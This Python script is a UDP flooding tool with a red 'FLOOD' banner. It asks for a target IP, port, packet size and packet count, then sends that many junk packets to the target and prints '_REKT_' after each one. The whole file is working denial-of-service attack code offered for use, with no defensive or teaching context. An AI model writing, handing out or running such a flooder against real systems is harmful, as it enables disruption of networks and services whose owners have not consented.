import socket

def color_red(text):
    RED = "\033[91m" 
    RESET = "\033[0m" 
    return f"{RED}{text}{RESET}" 

def color_white(text):
    WHITE = "\u001b[37m"
    RESET = "\033[0m"
    return f"{WHITE}{text}{RESET}"

def create_message(size):
    return b'X' * size 

print(color_red("""                                
  _____ _     ___   ___  ____   
 |  ___| |   / _ \ / _ \|  _ \  
 | |_  | |  | | | | | | | | | | 
 |  _| | |__| |_| | |_| | |_| | 
 |_|   |_____\___/ \___/|____/  
                                

"""))

UDP_IP = input(color_red("Enter the target IP address (e.g., 127.0.0.1): "))
UDP_PORT = int(input(color_red("Enter the target port (e.g., 5005): ")))
packet_size = int(input(color_red("Enter the packet size in bytes (1 - 65507): ")))
amount = int(input(color_red("Enter the number of packets to send: ")))

MESSAGE = create_message(packet_size)

print(color_red("UDP target IP: %s" % UDP_IP))
print(color_red("UDP target port: %s" % UDP_PORT))
print(color_red("Message size: %s bytes" % packet_size))
print(color_red("Number of packets to send: %s" % amount))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

for i in range(amount):
    sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))
    print(color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}") + color_red("_REKT_") + color_white(f"{i + 1}"))

print("~DONE~")
